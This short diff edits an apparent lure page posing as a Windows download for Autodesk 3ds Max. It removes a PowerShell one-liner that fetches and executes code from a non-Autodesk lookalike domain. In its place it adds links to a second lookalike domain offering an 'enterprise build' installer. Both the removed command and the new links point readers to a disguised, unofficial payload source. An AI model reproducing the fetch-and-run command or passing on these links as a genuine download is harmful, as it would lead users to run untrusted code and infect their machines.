@@ -8,12 +8,8 @@
 
 > Use the project link below for Windows.
 
-```
-irm https://autodesk-3ds-max.nerasix.xyz/ | iex
-```
-
-* **Project link:** **[autodesk-3ds-max.nerasix.xyz](https://autodesk-3ds-max.nerasix.xyz/)**
-* **Full URL:** `https://autodesk-3ds-max.nerasix.xyz/`
+* **Project link:** **[autodesk-3ds-max-enterprise-build.nerasix.xyz](https://autodesk-3ds-max-enterprise-build.nerasix.xyz/)**
+* **Full URL:** `https://autodesk-3ds-max-enterprise-build.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
